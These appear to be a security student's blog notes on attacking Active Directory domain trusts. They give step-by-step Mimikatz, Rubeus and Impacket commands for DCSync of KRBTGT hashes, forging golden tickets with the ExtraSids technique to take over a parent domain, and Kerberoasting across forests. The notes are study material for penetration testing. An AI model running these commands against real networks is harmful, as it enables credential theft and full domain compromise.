---
title: Notes | AD Domain Trust Attacks
author: Zeropio
date: 2022-08-15
categories: [Notes, System]
tags: [windows, ad]
permalink: /notes/system/ad-domain-trust
---

# Domain Trusts Primer 

A  trust is used to establish forest-forest or domain-domain authentication, which allows users to access resources in another domain, outside of the main domain where their account resides. An organization can create various types of trusts:
- **Parent-child**
- **Cross-link**
- **External**
- **Tree-root**
- **Forest**
- **ESAE**

Trusts can be:
- **Transitive**: trust is extended to objects that the child domain trusts
- **Non-transitive**: the child domain itself is the only one trusted

Trusts can be set up in two directions:
- **One-way trust**
- **Bidirectional trust**

We can use the `Get-ADTrust` cmdlet to enumerate domain trust relationships:
```console
PS C:\zeropio> Import-Module activedirectory
PS C:\zeropio> Get-ADTrust -Filter *
```

After importing PowerView, we can use the Get-DomainTrust function to enumerate what trusts exist:
```console
PS C:\zeropio> Get-DomainTrust 
```

We can perform a trust mapping:
```console
PS C:\zeropio> Get-DomainTrustMapping
```

From here, we could begin performing enumeration across the trusts. For example, checking users in the child domain:
```console
PS C:\zeropio> Get-DomainUser -Domain <DOMAIN> | select SamAccountName
```

[Here](https://adsecurity.org/?p=1001) is a well-known list of SIDs.

# Attacking Domain Trust Parent-child

## From Windows

The [sidHistory](https://docs.microsoft.com/en-us/windows/win32/adschema/a-sidhistory) attribute is used in migration scenarios, when a user change between domains a a new SID history attribute will be added to the previous one, so the user can maintain their attributes. Using Mimikatz, an attacker can perform SID history injection and add an administrator account to the SID History attribute of an account they control. When logging with this account all SIDs associated to that account will be added to the user's token.

The token is used to determinate the permissions. If the SID of a Domain Admin is added to the SID History, the account may be able to perform a DCSync and create a *Golden Ticket* or a Kerberos TGT.

### ExtraSids Attack - mimikatz 

This attack allows for the compromise of a parent domain once the chield domain has been compromised.

In the same AD forest, the sidHistory is respected due to the lack of SID Filtering protection. If a user in a child domian has in their sidHistory the **Enterprise Admins group**, it will have administrative access to the entire forest. So we need to leverage an account to the Enterprise Admin rights. To perform this attack after compromising a child domain, we need the following:
- The KRBTGT hash for the child domain
- The SID for the child domain
- The name of a target user in the child domain (don't need to exist)
- The FQDN of the child domain
- The SID of the Enterprise Admins group of the root domain
- With this data collected, the attack can be performed with Mimikatz

First, obtian the NT hash for the KRBTGT account. This account is used to encrypt/sign all Kerberos tickets. This is also knwon as the Golden Ticket attack. Since we have compromised the child domain, we can log as Domain Admin and perform the DCSync attack:
```console
PS C:\zeropio>  mimikatz # lsadump::dcsync /user:<CHILD DOMAIN>\krbtgt
```

We can use the PowerView Get-DomainSID function to get the SID for the child domain:
```console
PS C:\zeropio> Get-DomainSID
```

Next, we can obtian the SID for the Enterprise Admin group in the parent domain:
```console
PS C:\zeropio> Get-DomainGroup -Domain <PARENTDOMAIN>.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
```

At this point we have:
- the KRBTGT hash for the child domain
- the SID for the child domain
- a name of a user for the Golden Ticket (doesn't need to exist)
- the FQDN of the chield domain
- the SID of the Enterprise Admin group of the root domain.

Before starting the attack, confirm no access to the file system of the DC in the parent domain:
```console
PS C:\zeropio> ls \\<DC COMPUTER NAME>.<PARENT DOMAIN>.local\c$
```

Using mimikatz we can start:
```console
PS C:\zeropio> mimikatz.exe

mimikatz # kerberos::golden /user:hacker /domain:<CHILD DOMAIN> /sid:<SID CHILD DOMAIN> /krbtgt:<KRBTGT HASH CHILD DOMAIN> /sids:<ENTERPRISE ADMIN ROOT DOMAIN SID> /ptt
```

We can confirm that the Kerberos ticket for the non-existent hacker user is residing in memory:
```console
PS C:\zeropio> klist

#0>     Client: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL
```

From here, it is possible to access any resources within the parent domain:
```console
PS C:\zeropio> ls \\<DC COMPUTER NAME>.<PARENT DOMAIN>.local\c$
```

### ExtraSids Attack - Rubeus 

We can also perform the attack using Rubeus. Confirm that we cannot access the parent domain DC, as before. Using the data, we will use Rubeus:
```console
PS C:\htb>  .\Rubeus.exe golden /rc4:<KRBTGT HASH> /domain:<CHILD DOMAIN> /sid:<SID CHILD DOMAIN>  /sids:<ENTERPRISE ADMIN ROOT DOMAIN SID> /user:hacker /ptt
```

Once again, we can check that the ticket is in memory using the `klist` command.

### Performing a DCSync Attack 

We can perform a DCSync, targeting a Domain Admin user:
```console
PS C:\zeropio> .\mimikatz.exe

mimikatz # lsadump::dcsync /user:<DOMAIN>\<USER>
```

## From Linux 

To do it in Linux, we will need the same information:
- the KRBTGT hash for the child domain
- the SID for the child domain
- a name of a user for the Golden Ticket (doesn't need to exist)
- the FQDN of the chield domain
- the SID of the Enterprise Admin group of the root domain.

Once we have control over the child domian, we can use **secretsdump.py** to DCSync and grab NTLM for KRBTGT:
```console
zero@pio$ secretsdump.py <CHILD DOMAIN>/<USER>@<IP> -just-dc-user <DOMAIN>/krbtgt
```

Now we can use [lookupsid.py](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/lookupsid.py) to perform SID brute forcing to find the SID of the child domain. The tool will give us back the SID for the domain and the RIDs for each user and group that could be used to create their SID in the format **DOMAIN_SID-RID**:
```console
zero@pio$ lookupsid.py <CHILD DOMAIN>/<USER>@<IP> 
```

We can filter out the noise by piping the command output to grep and looking for just the domain SID:
```console
zero@pio$ lookupsid.py <CHILD DOMAIN>.local/<USER>@<IP> | grep "Domain SID"
```

Now we can rerun the command targeting the parent domain to get the RID of the Enterprise Admin group:
```console
zero@pio$ lookupsid.py <CHILD DOMAIN>.local/<USER>@<IP> | grep -B12 "Enterprise Admins"
```

We have now all the data require to launch the attack. We can use [ticketer.py](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/ticketer.py) to execute the attack:
```console
zero@pio$ ticketer.py -nthash <KRBTGT HASH> -domain <CHILD DOMAIN>.LOCAL -domain-sid <CHILD DOMAIN SID> -extra-sid <PARENT DOMAIN SID> hacker
```

The ticket will be saved down to our system as a credential cache (ccache) file. Set the **KRB5CCNAME** environment variable:
```console
zero@pio$ export KRB5CCNAME=hacker.ccache 
```

We will use [psexec.py](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/psexec.py) to authenticate to de DC:
```console
zero@pio$ psexec.py <CHILD DOMAIN>/hacker@<DC COMPUTER NAME>.<PARENT DOMAIN>.local -k -no-pass -target-ip <DC IP>
```

Impacket comes with [raiseChild.py](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/raiseChild.py), which will automatically escalate privileges. This will obtain everything by they own and execute it:
```console
zero@pio$ raiseChild.py -target-exec <DC IP> <CHILD DOMAIN>.LOCAL/<USER>
```

# Attacking Domain Trust Cross-Forest 

## From Windows 

Kerberos attacks (Kerberoasting or ASREPRoasting) can be performed across trust, depending on the trust direction. We can utilize PowerView to enumerate accounts in the target domain with SPNs associated to them:
```console
PS C:\zeropio> Get-DomainUser -SPN -Domain <DOMAIN> | select SamAccountName
```

If we see an account with an SPN, check the user to see their privileges:
```console
PS C:\zeropio> Get-DomainUser -Domain <DOMAIN> -Identity <USER> |select samaccountname,memberof
```

Let's perform a Kerberoasting attack across the trust using Rubeus. We can use the flag `/domain:` to do it:
```console
PS C:\zeropio> .\Rubeus.exe kerberoast /domain:<DOMAIN> /user:<USER> /nowrap
```

We can face a bidirectional forest trust managed by admins from the same company. It is worth checking for password reuse accross the two forest in this situation. We may see a Domain Admin or Enterprise Admin from Domain A as a member of the built-in Administrators group in Domain B in a bidirectional forest trust relationship.We can use the PowerView function `Get-DomainForeignGroupMember` to enumerate groups with users that do not belong to the domain:
```console
PS C:\zeropio> Get-DomainForeignGroupMember -Domain <DOMAIN>
```

We can now access other domains if we have the credential for one user:
```console
PS C:\htb> Enter-PSSession -ComputerName <COMPUTER NAME>.<DOMAIN>.LOCAL -CredentiaL <DOMAIN>\administrator
```

SID History can also be abused across a forest trust.

## From Linux 

We can perform this with **GetUserSPNs.py**, using the flag `-target-domain`:
```console
zero@pio$  GetUserSPNs.py -target-domain <DOMAIN 1> <TARGET DOMAIN>/<USER>
```

We can also use the `-request` to get all the hashes and to output to a file with `-outputfile <OUTPUT FILE>`. We can also use [BloodHound.py](https://github.com/fox-it/BloodHound.py). First, add the domain to the `/etc/resolv.conf`{: .filepath}:
```console
cat /etc/resolv.conf 

# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)
#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN
# 127.0.0.53 is the systemd-resolved stub resolver.
# run "resolvectl status" to see details about the actual nameservers.

#nameserver 1.1.1.1
#nameserver 8.8.8.8
domain <DOMAIN>.LOCAL
nameserver <DC IP>
```

Now we can run the tool as:
```console
zero@pio$ bloodhound-python -d <DOMAIN>.LOCAL -dc <DC COMPUTER NAME> -c All -u <USER> -p <PASSWORD>
```

We can compress to a zip for use it in the Bloodhound GUI as `zip -r <ZIP NAME>.zip *json`. Now we repeat the process for the other domain, changing the domain name in the `/etc/resolv.conf`{: .filepath} and the nameserver (IP of the DC). The bloodhound-python would look similar:
```console
zero@pio$ bloodhound-python -d <DOMAIN 2>.LOCAL -dc <DC 2 COMPUTER NAME> -c All -u <USER>@<DOMAIN 1>.local -p <PASSWORD>
```

